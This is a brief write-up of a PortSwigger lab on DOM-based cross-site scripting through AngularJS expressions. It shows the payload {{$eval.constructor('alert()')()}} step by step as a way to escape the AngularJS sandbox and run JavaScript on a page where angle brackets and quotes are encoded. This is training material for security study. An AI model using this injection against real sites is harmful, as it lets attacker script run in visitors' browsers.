# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression


```bash
# After checking page source we see that <body ng-app>. you can execute JavaScript expressions within {{}}.
{{5+4}}

#When you search this you get 9 as a result.
```

```bash
# There are inhereted functions that are defined in scope in angular from prototype. $eval, $on etc.
# let scope = angular.element(document.getElementById('academyLabHeader')).scope();
#  you can normally see scope by using that code on console but you can't see it in our lab.
# constructor creates a new function object.

#This will create our function, you can use $on too.
$eval.constructor('alert()')
```
```bash
# To run the code

$eval.constructor('alert()')()

# Format it for ngapp and we will be done.

{{$eval.constructor('alert()')()}}

```
# References
# https://www.youtube.com/watch?v=QpQp2JLn6JA
# https://www.youtube.com/watch?v=P7_JPsX1ses&t=149s
